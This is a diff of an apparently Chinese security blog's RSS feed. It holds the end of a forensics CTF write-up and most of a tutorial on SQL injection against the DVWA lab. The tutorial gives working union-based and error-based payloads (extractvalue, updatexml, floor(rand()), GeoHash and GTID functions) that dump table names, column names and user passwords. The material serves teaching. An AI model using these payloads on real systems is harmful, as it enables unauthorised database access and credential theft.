+&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710121649367.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250710121649367&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;com下找到主函数，代码逻辑中得到密码&lt;code&gt;1!8Da9Re5it2b3a.&lt;/code&gt;，解密10月和11月：&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709210608385.png&#34;
 	
 	
@@ -653,13 +723,13 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;小浩的手机号：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-sq&#34; data-lang=&#34;sq&#34;&gt;13533333333
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;42完整的受害人名单是几个人&#34;&gt;42.完整的受害人名单是几个人
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;13533333333
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;42完整的受害人名单是几个人&#34;&gt;42.完整的受害人名单是几个人
 &lt;/h2&gt;&lt;p&gt;上题得知，一共6人&lt;/p&gt;
 &lt;h2 id=&#34;43受害人转账的总金额是多少&#34;&gt;43.受害人转账的总金额是多少
 &lt;/h2&gt;&lt;p&gt;检材二中有一次付款，加密备份中有两次付款，每次都是200，通过上下文语境能知道三次付款没有重叠&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-sq&#34; data-lang=&#34;sq&#34;&gt;600
-&lt;/code&gt;&lt;/pre&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;600
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
         </item>
         <item>
         <title>SQL注入：从入门到入土</title>
@@ -825,10 +895,10 @@
 &lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:15px&#34;&gt;&lt;strong&gt;不过在此之前，先检查一下你之前的语句有没有写对吧~&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;2猜测sql查询语句中的字段数列数&#34;&gt;2.猜测SQL查询语句中的字段数（列数）
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; or 1=1 order by 1 #   
-1&amp;#39; or 1=1 order by 2 #  
-1&amp;#39; or 1=1 order by 3 #      //报错了
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;order by 3的时候报错，说明当前查询的表中只有2列&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order by 1 #   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order by 2 #  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order by 3 #      //报错了
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;order by 3的时候报错，说明当前查询的表中只有2列&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;and&lt;/code&gt;：如果and前为真，执行后面内容&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;or&lt;/code&gt;：如果前面为假，才执行后面内容&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
@@ -837,8 +907,8 @@
 &lt;p&gt;假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;
 	
 	
 	
@@ -856,8 +926,8 @@
 &lt;h3 id=&#34;4获取当前数据库&#34;&gt;4.获取当前数据库
 &lt;/h3&gt;&lt;p&gt;知道了回显位，我们就可以把回显位替换成想要的数据&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;mark&gt;这里一定要写全，有多少字段，select后面就要有多少相应的字段&lt;/mark&gt;&lt;/strong&gt;：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,database() #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt; 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database() #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt; 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34;
 	
 	
@@ -910,8 +980,8 @@
   &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;我们就可以从中得到想要的信息：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;
 	
 	
 	
@@ -922,8 +992,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;上面的语句效果等同于下面的语句，只不过使用了&lt;code&gt;group_concat()&lt;/code&gt;，让输出的内容拼成了一个字符串：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;
 	
 	
 	
@@ -983,8 +1053,8 @@
   &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;同样借此获取users表的字段：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; and table_schema=database()#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; and table_schema=database()#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34;
 	
 	
 	
@@ -996,8 +1066,8 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;这样就得到了users表的所有的列名称&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;这里要注意的是，除了指定表名之外，还要指定数据库名，否则就会出现很多不属于这个表的列名：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;
 	
 	
 	
@@ -1010,8 +1080,8 @@
 &lt;h3 id=&#34;7获取字段信息&#34;&gt;7.获取字段信息
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知道了表名和列名，就能轻松获取对应信息了&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;比如我想获取所有用户的id名称和对应密码：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select group_concat(user_id,first_name),group_concat(password) from users #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select group_concat(user_id,first_name),group_concat(password) from users #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;
 	
 	
 	
@@ -1025,8 +1095,8 @@
 &lt;h3 id=&#34;8逐行获取信息&#34;&gt;8.逐行获取信息
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;书接上文，如果我只想要显示某一条信息，就可以在末尾加上&lt;code&gt;limit m,n&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;意思是从第m条数据开始，显示包括n条数据，比如&lt;code&gt;limit 0,1&lt;/code&gt;，就是只显示第1条数据（数据从0开始存储）&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 1,1 #
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 1,1 #
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;
 	
 	
 	
@@ -1054,18 +1124,18 @@
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;我们使用了&lt;code&gt;database()&lt;/code&gt;函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;我们使用了&lt;code&gt;database()&lt;/code&gt;函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称&lt;/strong&gt;&lt;/p&gt;
 &lt;h4 id=&#34;updatexml-xml_document-xpath_string-new_value&#34;&gt;updatexml (XML_document, XPath_string, new_value)
 &lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/li&gt;
 &lt;li&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;第三个参数：&lt;code&gt;new_value&lt;/code&gt; 用来替换查找到的符合条件的数据&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也是同理会报错&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也是同理会报错&lt;/p&gt;
 &lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;之后的演示我会以&lt;code&gt;updatexml()&lt;/code&gt;和&lt;code&gt;extractvalue()&lt;/code&gt;为主&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;不那么常用的函数&#34;&gt;不那么常用的函数
@@ -1080,8 +1150,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;concat&lt;/span&gt;((&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;table_schema&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;dvwa&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;limit&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;))&lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;group&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;)&lt;span style=&#34;color:#e06c75&#34;&gt;a&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，我们输入这样的注入语句：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们看看每一个部分的作用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们看看每一个部分的作用：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;floor(rand(0)\*2)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
@@ -1120,8 +1190,8 @@
 &lt;p&gt;第三行：此时&lt;code&gt;rand()&lt;/code&gt;第四次被调用，计算出的键是&lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;，表里没有这个键，所以sql准备插入，此时第五次调用&lt;code&gt;rand()&lt;/code&gt;，计算出&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;插入&lt;/p&gt;
 &lt;p&gt;等等，不对！表里已经有&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;了！&lt;/p&gt;
 &lt;p&gt;这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（&lt;code&gt;Duplicate entry&lt;/code&gt;）的错误：**&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Duplicate entry &amp;#39;dvwa1&amp;#39; for key &amp;#39;group_key&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Duplicate entry &amp;#39;dvwa1&amp;#39; for key &amp;#39;group_key&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;strong&gt;这样，就把数据库名称带了出来&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;同时，我们还能总结出这样的规律：&lt;/strong&gt;&lt;/p&gt;
@@ -1151,11 +1221,11 @@
 &lt;/a&gt;&lt;/p&gt;
 &lt;h4 id=&#34;st_latfromgeohashgeohash_string&#34;&gt;ST_LatFromGeoHash(geohash_string)
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;和XPath_string一样，&lt;code&gt;~&lt;/code&gt;不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FUNCTION dvwa.ST_LatFromGeoHash does not exist
-		           ↑↑↑↑↑
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;st_longfromgeohashgeohash_string&#34;&gt;ST_LongFromGeoHash(geohash_string)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;和XPath_string一样，&lt;code&gt;~&lt;/code&gt;不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FUNCTION dvwa.ST_LatFromGeoHash does not exist
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		           ↑↑↑↑↑
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;st_longfromgeohashgeohash_string&#34;&gt;ST_LongFromGeoHash(geohash_string)
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;利用原理与&lt;code&gt;ST_LatFromGeoHash&lt;/code&gt;完全相同&lt;/strong&gt;&lt;/p&gt;
 &lt;h4 id=&#34;st_pointfromgeohashgeohash_string-srid&#34;&gt;ST_PointFromGeoHash(geohash_string, srid)
 &lt;/h4&gt;&lt;p&gt;&lt;strong&gt;好吧和上面还是一样的&lt;/strong&gt;&lt;/p&gt;
@@ -1170,63 +1240,63 @@
 &lt;/ul&gt;
 &lt;p&gt;一个合法的GTID单元由两部分组成，用冒号隔开：&lt;code&gt;source_id:transaction_id&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and GTID_SUBSET(database(), 1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;报错结果：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FUNCTION dvwa.GTID_SUBSET does not exist
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and GTID_SUBSET(database(), 1)#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;报错结果：&lt;/p&gt;
